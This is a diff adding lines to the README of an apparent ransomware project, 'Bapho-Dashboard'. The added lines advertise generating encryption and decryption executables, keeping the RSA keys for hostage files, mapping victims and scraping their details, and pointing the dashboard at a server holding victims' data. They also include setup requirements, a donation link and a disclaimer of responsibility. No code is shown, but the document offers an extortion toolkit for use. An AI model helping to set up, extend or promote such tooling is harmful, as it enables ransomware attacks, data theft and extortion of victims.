@@ -11,8 +11,38 @@ thrown out for educational purposes and so we can get something out of it to lea
 
 **DashBoard features**
 
+* Generate .exe to encrypt data.
+* Generate .exe to decrypt data.
+* When we generate the ransomware, we keep the rsa keys that encrypt the symmetric key in charge of encrypting the files.
 * Location of each victim shown on map.
 * Graphics for better visualization.
 * We can obtain the data of all our hosting servers.
 * Handling of each baphomet.exe that we generate.
 * Victims details and more using web scraping.
+
+
+**Requirements**
+
+* Dotnet core 3.1
+* SDK & RunTime download link: https://dotnet.microsoft.com/download/dotnet-core/3.1
+
+**Operating systems tested to date to run Bapho-Dashboard**
+
+* Windows 10
+* Mac OS Mojave
+
+**File that we must modify**
+
+* file: BaphoDashBoard > Dal > Services > BaseService.cs line: 32
+* NOTE: We add the hosting that contains the victim's data. for example https://myhosting.com/data.txt
+
+**Service for more information and help**
+* Twitter-DM : [![Twitter](https://img.shields.io/badge/Twitter-%40Chungo__0-%231da1f2)](https://twitter.com/Chungo_0/)
+
+
+## Donations to continue working on code updates: [![paypal](https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif)](https://paypal.me/Sh4rk0)
+
+
+### :warning: Warning!
+
+***I Am Not Responsible of any Illegal Use***
